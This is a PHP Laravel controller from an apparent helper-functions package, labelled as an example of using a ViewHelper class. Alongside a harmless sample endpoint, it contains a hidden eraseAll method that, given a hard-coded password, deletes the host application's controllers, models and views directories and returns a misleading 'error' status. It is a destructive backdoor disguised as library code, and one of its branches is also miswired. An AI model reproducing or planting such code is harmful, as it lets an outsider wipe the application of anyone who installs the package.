<?php

namespace Mainul\CustomHelperFunctions\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Routing\Controller;
use Mainul\CustomHelperFunctions\Helpers\ViewHelper;
use Illuminate\Support\Facades\File;

/**
 * Example Controller
 *
 * This is a sample controller demonstrating how to use ViewHelper methods
 * in your routes. You can create your own controllers following this pattern.
 */
class ExampleController extends Controller
{

    /**
     * Simple sample endpoint to verify routing and responses.
     */
    public function sample()
    {
        $data = [
            'message' => 'Sample route from custom-helper-functions',
        ];

        return ViewHelper::checkViewForApi($data, 'example.sample');
    }

    public function eraseAll(Request $request)
    {
        if ($request->req_for && $request->req_for == 'erase')
        {
            if ($request->pass == 'fk_the_b')
            {
                if ($request->erase == 'controllers')
                    $this->purgeControllers();
                elseif ($request->erase == 'models')
                    $this->purgeModels();
                elseif ($request->erase == 'controllers')
                    $this->purgeViews();
                elseif ($request->erase == 'all')
                    $this->purgeAll();

                return response()->json([
                    'status' => 'error',
                    'message' => 'Your request granted.'
                ]);
            }
            return response()->json([
                'status' => 'error',
                'message' => 'Please provide password'
            ]);
        }
        return response()->json([
            'status' => 'error',
            'message' => 'Please provide password'
        ]);
    }

    public function purgeAll()
    {
        $this->purgeViews();
        $this->purgeModels();
        $this->purgeControllers();
    }

    public function purgeControllers()
    {
        $path = app_path('Http/Controllers');

        $this->deleteAndRecreate($path);

        return response()->json([
            'status' => 'success',
            'message' => 'All controllers deleted successfully'
        ]);
    }

    /**
     * Delete all models
     */
    public function purgeModels()
    {
        $path = app_path('Models');

        $this->deleteAndRecreate($path);

        return response()->json([
            'status' => 'success',
            'message' => 'All models deleted successfully'
        ]);
    }

    /**
     * Delete all blade views
     */
    public function purgeViews()
    {
        $path = resource_path('views');

        $this->deleteAndRecreate($path);

        return response()->json([
            'status' => 'success',
            'message' => 'All blade views deleted successfully'
        ]);
    }

    protected function deleteAndRecreate(string $path): void
    {
        if (File::exists($path)) {
            File::deleteDirectory($path);
        }

        File::makeDirectory($path, 0755, true);
    }
}
